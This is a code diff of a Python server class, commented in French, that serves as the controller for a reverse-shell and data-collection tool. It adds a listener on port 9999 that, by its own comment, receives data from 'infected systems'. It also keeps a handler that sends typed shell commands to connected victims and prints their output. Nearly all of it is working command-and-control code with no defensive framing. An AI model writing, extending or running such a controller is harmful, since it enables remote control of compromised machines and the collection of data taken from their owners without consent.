@@ -19,12 +19,11 @@ class Server():
             elif platform.system() == "Windows":
                 os.system("cls")
 
-    def encode(self, data):
-        # return json.dumps(data).encode("UTF-8")
-        return bytes(json.dumps(data), "UTF-8")
+    def _sending(self, c, data):
+        return c.send(bytes(json.dumps(data), "UTF-8"))
          
     
-    def decode(self, c):
+    def _receiving(self, c):
         data = ""
         while True:
             try:
@@ -33,7 +32,7 @@ class Server():
             except ValueError:
                 continue
 
-    def incomingData(self, c):
+    def _systemData(self, c):
         data = {}
         while True:
             if data["message"] == "exit":
@@ -41,14 +40,15 @@ class Server():
                 break
             else:
                 # TODO: Change print for DAO 
-                data = self.decode(c)
+                data = self._receiving(c)
                 print(data["message"])
 
-    def incomingReverseShell(self, c):
+    def _ReverseShell(self, c):
 
         quitting = False
+
         # Reçoit le premier message et initialise data["cwd"]
-        data = self.decode(c)
+        data = self._receiving(c)
         while not quitting:
 
             data["command"] = input(f"{data['cwd']} $> ")
@@ -58,8 +58,9 @@ class Server():
                 self.clrscr()
                 continue
             else:
-                c.send(self.encode(data))
-                data = self.decode(c)
+                # c.send(self.encode(data))
+                self._sending(c, data)
+                data = self._receiving(c)
             
             if data["command"].lower() == "exit":
                 quitting = True
@@ -68,32 +69,8 @@ class Server():
         
             print(data["output"])
 
-
-    def main(self):
-        # [1]_ [2]_  
-
-    # Starting data
-        # c = None
-        # addr = None
-        # message = 'Waiting for connection'
-        # s = socket.socket()
-        # host = "0.0.0.0"
-        # port = 9999
-        # s.bind((host, port))
-        # s.listen(5)
-
-        # while True:
-        #     c, addr = s.accept()
-        #     print('Got connection from', addr)
-        #     # On crée un thread receiving data
-        #     connection_handler = threading.Thread(
-        #         target=incomingData,
-        #         args=(c, message,)
-        #     )
-        #     connection_handler.start()
-        #     print("\n Nombre de Thread", threading.active_count())
-    
-    # Starting Reverse Shell
+    def _serverReverseShell(self):
+        # Démarre le service pour recevoir les connexions ReverseShell
         c = None
         addr = None
 
@@ -112,17 +89,61 @@ class Server():
 
                 # On crée un thread receiving data
                 connection_handler = threading.Thread(
-                    target=self.incomingReverseShell,
+                    target=self._ReverseShell,
                     args=(c,)
                 )
                 connection_handler.start()
                 print("\n Nombre de Thread", threading.active_count())
             except socket.timeout:
                 continue
+    
+
+    def _serverData(self):
+        # Démarre le service pour recevoir les données des systèmes infectés
+
+        c = None
+        addr = None
+
+        s = socket.socket()
+        host = "0.0.0.0"
+        port = 9999
+        s.bind((host, port))
+        s.listen(5)
+
+        while True:
+            c, addr = s.accept()
+            print('Got connection from', addr)
+            
+            # On crée un thread receiving data
+            connection_handler = threading.Thread(
+                target=self._systemData,
+                args=(c,)
+            )
+            connection_handler.start()
+            print("\n Nombre de Thread", threading.active_count())
+
+    def main(self):
+        # Démarre deux threads pour recevoir les connexions ReverseShell et d'envoi de données
+        self._serverReverseShell()
+
+    
 
 
 if __name__ == "__main__":
    Server().main()
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 '''
